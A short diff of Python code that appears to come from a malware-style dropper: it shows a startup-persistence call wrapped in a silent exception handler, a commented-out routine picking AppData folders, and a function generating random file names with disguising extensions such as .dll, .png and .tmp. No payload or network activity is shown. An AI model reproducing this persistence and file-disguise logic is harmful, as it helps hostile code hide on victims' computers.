@@ -26,7 +26,6 @@ try:
     startUP(DoYouKnowTheWay)
 except:
     pass
-
 # def getPath():
 #     path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
 #     directory = listdir(path)
@@ -37,10 +36,10 @@ except:
 #             return ye
 #     return getenv("TEMP")
 
-def getName():
-    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
-    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
-    return firstName + choice(lasName)
+# def getName():
+#     firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
+#     lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
+#     return firstName + choice(lasName)
 
 def install(path):
     with open(path, mode='w', encoding='utf-8') as f:
